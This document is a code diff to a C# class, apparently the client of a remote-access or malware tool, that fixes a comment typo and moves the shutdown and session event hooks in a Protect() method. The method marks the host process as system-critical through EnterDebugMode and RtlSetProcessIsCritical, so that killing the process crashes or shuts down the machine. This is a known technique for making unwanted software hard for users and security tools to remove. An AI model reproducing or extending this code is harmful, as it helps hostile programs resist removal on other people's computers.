@@ -62,7 +62,7 @@ namespace Client.Armitage
         }
 
         /// <summary>
-        /// If not alreay protected, will make the host process a system-critical process so it
+        /// If not already protected, will make the host process a system-critical process so it
         /// cannot be terminated without causing a shutdown of the entire system.
         /// </summary>
         public static void Protect()
@@ -70,19 +70,25 @@ namespace Client.Armitage
             Debug.WriteLine("Protected");
             try
             {
+                /// Protect Shutdown so it won't be a bluescreen.
+                SystemEvents.SessionEnding += UserLoggingOut;
+
+                SystemEvents.SessionEnded += UserLoggingOut;
+
+                SystemEvents.SessionSwitch += UserChanged;
+
+                Console.WriteLine("Entering Write Lock");
+
                 s_isProtectedLock.EnterWriteLock();
 
                 if (!s_isProtected)
                 {
                     System.Diagnostics.Process.EnterDebugMode();
+
                     RtlSetProcessIsCritical(1, 0, 0);
+
                     s_isProtected = true;
                 }
-
-                /// Protect Shutdown so it won't be a bluescreen.
-                SystemEvents.SessionEnding += UserLoggingOut;
-                SystemEvents.SessionEnded += UserLoggingOut;
-                SystemEvents.SessionSwitch += UserChanged;
             }
             finally
             {
@@ -115,10 +121,8 @@ namespace Client.Armitage
             try
             {
                 s_isProtectedLock.EnterWriteLock();
-
                 RtlSetProcessIsCritical(0, 0, 0);
                 s_isProtected = false;
-
             }
             finally
             {
